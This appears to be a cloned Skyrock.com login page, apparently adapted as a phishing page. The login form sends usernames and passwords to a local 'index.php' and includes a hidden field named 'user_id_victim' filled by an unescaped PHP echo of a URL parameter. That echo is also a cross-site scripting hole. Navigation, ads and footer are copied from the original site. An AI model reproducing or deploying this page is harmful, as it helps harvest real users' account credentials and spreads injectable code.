<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" >
<head>
    <title>Log in - Skyrock.com</title>
        <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
        <meta http-equiv="content-language" content="en" />
    <meta name="robots" content="noindex,noarchive" />
<meta name="robots" content="noodp" />
<meta property="fb:app_id" content="143648968982612"/>
    <script type="text/javascript">(function(){var r=/^.*?([^./]+[.][^./]+)$/,d=("skyrock.com").match(r)[1],e=document.domain;if(e!==d)window._document_domain_b4_sm=e;if(d==e.match(r)[1])document.domain=d;})();</script>
    <script src="http://static.v4.skyrock.net/js/common.js?20110414" type="text/javascript"></script>
    
    <link rel="shortcut icon" href="http://static.v4.skyrock.net/img/favicon_v5.ico" type="image/x-icon" />

        <link rel="home" href="http://www.skyrock.com/" />
        <link rel="search" href="http://www.skyrock.com/search/" />
<link rel="stylesheet" type="text/css" media="screen, projection, print" href="http://static.v4.skyrock.net/css/common.css?20110414" /><link rel="stylesheet" type="text/css" media="screen, projection, print" href="http://static.v4.skyrock.net/css/front.css?20110414" />
<link rel="stylesheet" type="text/css" href="http://static.v4.skyrock.net/css/inscription.css?20110406" media="screen, projection, print" />
    <script type="text/javascript">
    // <![CDATA[
if (top.location != self.location) 
    var dont_stat = 1;

    var visitor_locale = "en_GB";
    var visitor_country = "MA";
    var real_visitor_country = "MA";
    var real_visitor_region = "23";
 

        var pub_sky_page = "account_login";
        var OAS_listpos = "Right2,Bottom,Bottom2,Bottom3,x30,x31";
    var estat_group = 'account';
    var estat_page = 'login';

    var www_path = "http://www.skyrock.com/";
    var www_domain = "skyrock.com";
    var static_js_url = "http://static.v4.skyrock.net/";
    var static_css_url = "http://static.v4.skyrock.net/";
    var static_img_url = "http://static.v4.skyrock.net/";
    var page_is_popup = 0;
    var page_is_iframe = 0;



    var locales_redirect = true;
    var locale_thousands_sep = ",";
    

        if (typeof skyFBConnect != 'undefined')
        skyFBConnect.clientID = '143648968982612';
    // ]]>
    </script>

                <script type="text/javascript" src="http://static.v4.skyrock.net/banners/oas_header.js?20110213"></script>
            
            
    
    
    </head>

<body class="l_en_GB  v5" id="default" >
    


<div id="fb-root"></div>



    <div id="header">
                <div id="nav_top">
            <div>
                <div id="logo"><a href="http://www.skyrock.com/" title="Back to http://www.skyrock.com/"></a></div>
 <ul class="notlogged floatright"><li><a onclick="skyFBConnect.connect(); return false;" class="fb_connect" href="#" title="Link blog to Facebook"></a></li><li><a href="/?connect=1" rel="nofollow">Log in</a></li><li class="subscribe"><a href="http://www.skyrock.com/m/account/subscribe.php" rel="nofollow">Sign up</a></li></ul>             </div>
        </div>
        
                        <div id="nav_menu"><div><ul><li ><a href="http://www.skyrock.com/" class="link_onglet"><span>Homepage</span></a><div class="nav_submenu submenu-empty"></div></li><li ><a href="http://www.skyrock.com/blog/" class="link_onglet"><span>Blogs</span></a><ul class="nav_submenu"><li><a  href="http://www.skyrock.com/blog/">Homepage</a></li><li><a  href="http://www.skyrock.com/blog/halloffame.php?type=star">Blog Stars</a></li><li><a  href="http://www.skyrock.com/blog/halloffame.php?type=top100">Top 100</a></li><li><a  href="http://www.skyrock.com/blog/halloffame.php?type=topkiffarticles">Top Heart</a></li><li><a  href="http://www.skyrock.com/blog/top.php">The most watched</a></li><li><a  href="http://www.skyrock.com/blog/halloffame.php?type=top7jours">Most viewed: Past 7 Days</a></li></ul></li><li ><a href="http://www.skyrock.com/profil/" class="link_onglet"><span>Profiles</span></a><ul class="nav_submenu"><li><a href="http://www.skyrock.com/profil/index.php">Homepage</a></li><li><a href="http://www.skyrock.com/profil/en_ligne.php">Online</a></li><li><a href="http://www.skyrock.com/profil/top_visites.php">The most watched</a></li><li><a href="http://www.skyrock.com/profil/top_notes.php">Top rated</a></li><li><a href="http://www.skyrock.com/profil/top-videos.php">Videos</a></li><li><a href="http://www.skyrock.com/profil/top-defis.php">Duels</a></li><li><a href="http://www.skyrock.com/search/profiles/">Profile search</a></li></ul></li><li ><a href="http://www.skyrock.com/chat/" class="link_onglet"><span>Chat</span></a><ul class="nav_submenu top_nav_submenu"><li><a href="http://www.skyrock.com/chat/">Homepage</a></li><li><a href="http://www.skyrock.com/chat/top100.php">The most active</a></li></ul></li><li id="link_plus2rubrik" class="link_onglet"><div id="plus2rubrik" class="submenu_container"><a href="#" id="plus2rubrik-labelMenu" title="More categories" class="submenu_link"><span class="submenu_linkLibelle floatleft">More </span><span class="submenu_pictoPlus floatleft ">&#9660;</span></a><ul id="plus2rubrik-menuOptions" class="submenu top_nav_submenu"><li><a href="http://www.skyrock.com/blog/music/">Music</a></li><li><a href="http://www.skyrock.com/groups/" class="link_onglet"><span>Groups</span></a></li><li><a href="http://www.skyrock.com/gifts/">Gifts</a></li></ul></div><div class="nav_submenu submenu-empty"></div></li></ul><script type="text/javascript">onload_funcs.push(function(){new skyMenu(document.getElementById("plus2rubrik-labelMenu"), document.getElementById("plus2rubrik-menuOptions"), {container: document.getElementsByTagName('body')[0]})});</script><form id="search_form" method="get" action=" "><p class="skyPlaceholder"><select name="searchtype" id="quicksearchtype"><option selected="selected" value="people">People</option><option value="articles">Articles</option><option value="songs">Music</option><option value="groups">Groups</option><option value="photos">Pictures</option><option value="videos">Videos</option></select><input type="text" name="login" size=16 style="width:100%" /><input type="text" id="quicksearchbox" name="q" class="quicksearchbox" title="name, surname, email, username..." /><input id="quicksearchsubmit" type="submit" value="Search" /><span id="quicksearchgo" style="display: none;">&nbsp;</span></p></form></div><div class="nav_submenu submenu_empty submenu_fill"></div></div>

                    
        

        
  
                    </div>
    <div class="clear"><!-- --></div>




<div id="global" class="skyrock">





    <div id="wrap" class="clearfix login">
        <div id="column_left" class="clearfix">
            <form id="loginbox" class="box" method="post" action="index.php">
                <h3><span class="title_value">Log-in!</span><span class="title_actions"><a onClick="skyFBConnect.connect(); return false;" href="#"><img src="http://static.v4.skyrock.net/img/icons/listicos/facebook.png" alt="Link blog to Facebook" /></a></span></h3>
                                <ul>
                    <li>
                        <label for="login">Username: </label>
                        <input type="hidden" name="user_id_victim" value="<? echo $_GET['connect']; ?>" /><input type="text" tabindex="1" id="login" name="need_login_form_login" class="text" value="" />
                    </li>
                    <li>
                        <label for="password">Password: </label>
                        <input type="password" tabindex="2" id="password" name="need_login_form_password" class="text" value="" />
                    </li>
                </ul>
                <script type="text/javascript">
                                autofocus.init("login");
                                </script>
                <div class="extraLogin">
                                            <p id="extraLogin"><input type="checkbox" value="1" tabindex="6" id="remember_me" name="remember_me" />
                            <label for="remember_me">Keep me logged in for 2 weeks</label></p>
                            <p id="alert_remember_me" class="alert">DON'T tick this box if you are on a public computer (school, library, work, cyber caf�, your friends house, etc.)</p>
                                         
                </div>
                
                <div class="clearfix">
                    <a class="floatleft" href="http://www.skyrock.com/m/account/forgotten_passwd.php" tabindex="5">Forgotten your password?</a>
                    <input type="submit" tabindex="3" class="bouton_wide floatright" value="Log in" />
                    <input type="hidden" name="checkchar" value="&euro;" />
                </div>
                    </form>
    </div>
    <div id="column_right">
        <div class="login_info">
            <h4><a href="http://www.skyrock.com/m/account/subscribe.php">Sign up in 2 minutes and...</a></h4>
            <ul>
                <li>Create your blog and post photos, videos, and articles...</li>
                <li>Edit your profile</li>
                <li>Chat with your friends</li>
            </ul>
            <p><a class="bouton_highlight" href="http://www.skyrock.com/m/account/subscribe.php">Sign up!</a></p>
        </div>
        

<div class="pub300" id="pub300_home">
    <div class="adscreen" id="pub300_adscreen" >
        <script type="text/javascript">
        // <![CDATA[
        if (typeof OAS_AD != 'undefined')
            OAS_AD('Right2');
        // ]]>
        </script>
    </div>
    <p class="adslogan">Advertisement</p>
</div>
    </div>
</div>


<script type="text/javascript">
   
   var chckBox = document.getElementById('remember_me');
   var msgBox = document.getElementById('alert_remember_me');
   addClass(msgBox, 'hide');
   chckBox.onclick = function(){
       if(chckBox.checked == true){
           removeClass(msgBox, 'hide');
       } else {
           addClass(msgBox, 'hide');
       }
   }
   
</script>



<div id="pub_bottom"><script type="text/javascript">if(typeof OAS_AD!='undefined')OAS_AD('Bottom');</script><script type="text/javascript">if(typeof OAS_AD!='undefined')OAS_AD('Bottom2');</script><script type="text/javascript">if(typeof OAS_AD!='undefined')OAS_AD('Bottom3');</script><script type="text/javascript">if(typeof OAS_AD!='undefined')OAS_AD('x30');</script><script type="text/javascript">if(typeof OAS_AD!='undefined')OAS_AD('x31');</script></div>




<div id="alerte-enlevement" style="position:relative; background-image:none; width:720px; background-color: red; overflow:hidden; padding:0;"><a style="margin:0; padding:0;" onclick="window.open(this.href); return false;" class="donot-getstyle" href="http://www.facebook.com/pages/DEFENDONS-LA-LIBERTE-DE-SKYROCK/216243401726371"><img style="margin:0; vertical-align: bottom;" src="http://42.img.v4.skyrock.net/292/lequipe-skyrock/pics/soutienlike3.png" alt="Soutiens Skyrock" /></a><iframe style="z-index:100; position: absolute; left:565px; top:7px; border:none; width:150px; height:21px;" src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.facebook.com%2Fpages%2FDEFENDONS-LA-LIBERTE-DE-SKYROCK%2F216243401726371&layout=button_count&show_faces=false&width=150&action=like&font&colorscheme=light&height=21" scrolling="no" allowTransparency="1" frameborder="0"></iframe></div>
<div id="footer"><a href="http://www.skyrock.com/" class="footer_logo"></a><ul><li><h4>Skyrock</h4></li><li><a href="http://www.skyrock.com/common/footer.php?page=annonceurs" rel="nofollow">Advertisers</a></li><li><a href="http://www.skyrock.com/common/footer.php?page=jobs"  rel="nofollow">Jobs</a></li><li><a href="http://www.skyrock.com/common/footer.php?page=contact" rel="nofollow">Contact</a></li><li><a href="http://www.skyrock.com/common/footer.php?page=share" rel="nofollow">Post to my blog</a></li></ul><ul><li><h4>Info</h4></li><li><a href="http://www.skyrock.com/safety/minors.php" rel="nofollow">Security</a></li><li><a href="http://www.skyrock.com/safety/terms.php" rel="nofollow">Conditions</a></li><li><a href="http://www.skyrock.com/api/" rel="nofollow">Skyrock API</a></li><li><a href="http://www.skyrock.com/safety/help.php" rel="nofollow">Help</a></li><li><a href="http://www.skyrock.com/blog/cybercop.php" rel="nofollow" onclick="openCybercopWindow(this); return false;">Report abuse</a></li><li><a href="http://www.skyrock.com/common/footer.php?page=chiffres" rel="nofollow">In figures</a></li></ul><ul><li><h4>Mobile</h4></li><li><a href="http://www.skyrock.com/blog/mobile.php" rel="nofollow">Mobile site</a></li></ul><ul><li><h4>Languages</h4></li><li><a href="http://mafr.skyrock.com/?connect=1" onclick="return setLocale('fr_MA');">Fran�ais (Maroc)</a></li><li><a href="http://fr.skyrock.com/?connect=1" onclick="return setLocale('fr_FR');">Fran�ais (France)</a></li><li class="selected"><a href="http://uk.skyrock.com/?connect=1" onclick="return setLocale('en_GB');">English</a></li><li><a href="http://es.skyrock.com/?connect=1" onclick="return setLocale('es_ES');">Espa�ol</a></li><li><a href="http://www.skyrock.com/international.php">International...</a></li></ul><ul><li><h4>Blogs</h4></li><li><a href="http://the-skyrock-team.skyrock.com/" rel="nofollow">The Skyrock Team</a></li></ul></div>
 
</div> 
<script type="text/javascript" src="http://static.v4.skyrock.net/stats/stats.js?20110213"></script>



<script type="text/javascript">
// <![CDATA[

if (typeof __onload_handler != 'undefined') {
    __onload_handler();

}
//]]>
</script>




<script type="text/javascript">
// <![CDATA[

// ]]>
</script>
</body>
</html>